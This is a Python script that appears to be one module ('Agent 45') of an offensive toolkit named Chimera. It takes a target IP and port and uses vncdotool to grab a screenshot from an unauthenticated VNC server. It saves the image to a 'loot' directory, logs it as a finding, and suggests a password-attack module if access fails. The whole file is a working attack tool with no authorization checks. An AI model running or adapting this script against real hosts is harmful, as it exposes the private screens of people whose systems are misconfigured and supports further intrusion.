import os
import sys
import subprocess
from datetime import datetime

sys.path.append('/home/dan/Chimera_Project')
from core.db_handler import ChimeraDB

def run():
    db = ChimeraDB()
    os.system('clear')
    print("\033[36m" + "="*60)
    print("   CHIMERA AGENT 45 :: VNC VISUAL RECON (SCREENSHOTTER)")
    print("="*60 + "\033[0m")

    target = input("[?] Target IP: ").strip()
    port = input("[?] VNC Port (Default 5900): ").strip() or "5900"
    
    # We use 'vncdotool' which is already in your venv bin/
    # It allows us to interact with VNC without a GUI (Headless)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M")
    output_file = f"/home/dan/Chimera_Project/loot/{target}_vnc_{timestamp}.png"

    print(f"[*] Attempting to capture screen from {target}:{port}...")

    # The command: connect, wait 2 seconds for render, take screenshot, exit
    cmd = f"vncdotool -s {target}::{port} capture {output_file}"

    try:
        # We try it without a password first
        process = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=15)
        
        if os.path.exists(output_file):
            print(f"\033[92m[+] SUCCESS: Screenshot saved to {output_file}\033[0m")
            db.report_finding("45_VNC_Viewer", "VNC_Screenshot_Captured", {
                "target": target,
                "file_path": output_file,
                "severity": "MEDIUM"
            })
        else:
            print(f"\033[93m[*] Access Denied or Connection Failed: {process.stderr.strip()}\033[0m")
            print("[*] Tactical Note: Try Agent 38 with 'vnc' protocol if password is required.")

    except subprocess.TimeoutExpired:
        print("\033[91m[!] Connection timed out. Target might be firewalled.\033[0m")
    except Exception as e:
        print(f"[!] Error: {e}")

    db.close()

if __name__ == "__main__":
    run()
